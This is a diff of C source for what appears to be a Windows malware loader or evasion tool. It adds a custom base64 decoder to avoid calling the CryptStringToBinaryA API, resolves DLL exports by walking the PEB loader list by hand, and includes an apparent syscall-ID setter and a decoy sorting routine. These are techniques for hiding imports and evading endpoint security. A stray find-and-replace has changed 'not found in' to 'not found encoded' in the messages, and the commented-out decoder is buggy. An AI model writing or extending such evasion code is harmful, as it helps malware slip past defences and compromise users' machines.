@@ -55,28 +55,115 @@ void SetSyid(DWORD value) {
     smID = value;
 }
 
-char* Bsfd(const char* encoded) {
-    DWORD outLen = 0;
-    BYTE* decoded = NULL;
-    
-    // Get the required output buffer size
-    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) {
-        return NULL;
-    }
+int Base64CharToValue(char c) {
+    if (c >= 'A' && c <= 'Z') return c - 'A';
+    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
+    if (c >= '0' && c <= '9') return c - '0' + 52;
+    if (c == '+') return 62;
+    if (c == '/') return 63;
+    return -1;  // Invalid character
+}
 
-    // Allocate buffer
-    decoded = (BYTE*)malloc(outLen + 1);
+const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+// This table implements the mapping from 8-bit ascii value to 6-bit
+// base64 value and it is used during the base64 decoding
+// process. Since not all 8-bit values are used, some of them are
+// mapped to -1, meaning that there is no 6-bit value associated with
+// that 8-bit value.
+//
+int UNBASE64[] = {
+    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 0-11
+    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 12-23
+    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 24-35
+    -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, // 36-47
+    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -2, // 48-59
+    -1,  0, -1, -1, -1,  0,  1,  2,  3,  4,  5,  6, // 60-71
+    7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17, 18, // 72-83
+    19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, // 84-95
+    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, // 96-107
+    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, // 108-119
+    49, 50, 51, -1, -1, -1, -1, -1, -1, -1, -1, -1, // 120-131
+  };
+
+char* Bsfd(const char* encoded) {
+    int in_index = 0;
+    int out_index = 0;
+    char first, second, third, fourth;
+
+    size_t len = strlen(encoded);
+    if (len % 4 != 0) return NULL; // Invalid Base64 length
+
+    size_t outLen = (len / 4) * 3;
+    if (encoded[len - 1] == '=') outLen--;
+    if (encoded[len - 2] == '=') outLen--;
+
+    unsigned char* decoded = (unsigned char*)malloc(outLen + 1);
     if (!decoded) return NULL;
 
-    // Perform the decoding
-    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, decoded, &outLen, NULL, NULL)) {
-        free(decoded);
-        return NULL;
+    while( in_index < len ) {
+        // check if next 4 byte of input is valid base64
+        for (int i = 0; i < 4; i++) {
+            if (((int)encoded[in_index + i] > 131) || UNBASE64[ (int) encoded[in_index + i] ] == -1) {
+                fprintf(stderr, "Invalid base64 char, cannot decode: %c\n", encoded[in_index + i]);
+                return (char*)decoded;
+            }
+        }
+
+        // extract all bits and reconstruct original bytes
+        first = UNBASE64[ (int) encoded[in_index] ];
+        second = UNBASE64[ (int) encoded[in_index + 1] ];
+        third = UNBASE64[ (int) encoded[in_index + 2] ];
+        fourth = UNBASE64[ (int) encoded[in_index + 3] ];
+
+        // reconstruct first byte
+        decoded[out_index++] = (first << 2) | ((second & 0x30) >> 4);
+
+        // reconstruct second byte
+        if (encoded[in_index + 2] != '=') {
+            decoded[out_index++] = ((second & 0xF) << 4) | ((third & 0x3C) >> 2);
+        }
+
+        // reconstruct third byte
+        if (encoded[in_index + 3] != '=') {
+            decoded[out_index++] = ((third & 0x3) << 6) | fourth;
+        }
+
+        in_index += 4;
     }
 
-    decoded[outLen] = '\0';  // Null-terminate the string
+    decoded[out_index] = '\0';
     return (char*)decoded;
 }
+
+// char* BsfdTmp(const char* encoded) {
+//     if (!encoded) return NULL;
+
+//     size_t len = strlen(encoded);
+//     if (len % 4 != 0) return NULL; // Invalid Base64 length
+
+//     size_t outLen = (len / 4) * 3;
+//     if (encoded[len - 1] == '=') outLen--;
+//     if (encoded[len - 2] == '=') outLen--;
+
+//     unsigned char* decoded = (unsigned char*)malloc(outLen + 1);
+//     if (!decoded) return NULL;
+
+//     int j = 0;
+//     for (size_t i = 0; i < len; i += 4) {
+//         int val = (Base64CharToValue(encoded[i]) << 18) |
+//                   (Base64CharToValue(encoded[i + 1]) << 12) |
+//                   (Base64CharToValue(encoded[i + 2]) << 6) |
+//                   (Base64CharToValue(encoded[i + 3]));
+
+//         if (encoded[i + 2] != '=') decoded[j++] = (val >> 16) & 0xFF;
+//         if (encoded[i + 3] != '=') decoded[j++] = (val >> 8) & 0xFF;
+//         decoded[j++] = val & 0xFF;
+//     }
+
+//     decoded[outLen] = '\0'; // Null-terminate
+//     return (char*)decoded;
+// }
 
 void SortNumbers() {
     int numbers[ARRAY_SIZE];
@@ -111,13 +198,13 @@ void SortNumbers() {
 pMod GetMod(LPCSTR mod, LPCSTR fn) {
     PPEB pPEB = (PPEB)__readgsqword(0x60);
     if (!pPEB) {
-        // printf("[!] Failed to retrieve PEB.\n");
+        printf("[!] Failed to retrieve PEB.\n");
         return NULL;
     }
 
     PPEB_LDR_DATA pLdr = pPEB->Ldr;
     if (!pLdr) {
-        // printf("[!] Failed to retrieve LDR data.\n");
+        printf("[!] Failed to retrieve LDR data.\n");
         return NULL;
     }
 
@@ -146,7 +233,7 @@ pMod GetMod(LPCSTR mod, LPCSTR fn) {
         }
 
         if (strstr(dllName, mod)) {
-            // printf("[*] Found %s at: %p\n", mod, hModuleBase);
+            printf("[*] Found %s at: %p\n", mod, hModuleBase);
 
             // Locate Export Directory
             IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModuleBase;
@@ -154,7 +241,7 @@ pMod GetMod(LPCSTR mod, LPCSTR fn) {
             IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
             if (!expDir) {
-                // printf("[!] Export directory not found!\n");
+                printf("[!] Export directory not found!\n");
                 return NULL;
             }
 
@@ -165,18 +252,18 @@ pMod GetMod(LPCSTR mod, LPCSTR fn) {
             for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
                 LPCSTR functionName = (LPCSTR)((BYTE*)hModuleBase + names[i]);
                 if (strcmp(functionName, fn) == 0) {
-                    // printf("[*] %s found at: %p\n", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
+                    printf("[*] %s found at: %p\n", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
                     return (pMod)((BYTE*)hModuleBase + functions[ordinals[i]]);
                 }
             }
 
-            // printf("[!] %s not found in %s exports.\n", fn, mod);
+            printf("[!] %s not found encoded %s exports.\n", fn, mod);
             return NULL;
         }
 
         pEntry = pEntry->Flink;
     }
 
-    // printf("[!] %s not found in PEB.\n", mod);
+    printf("[!] %s not found encoded PEB.\n", mod);
     return NULL;
 }
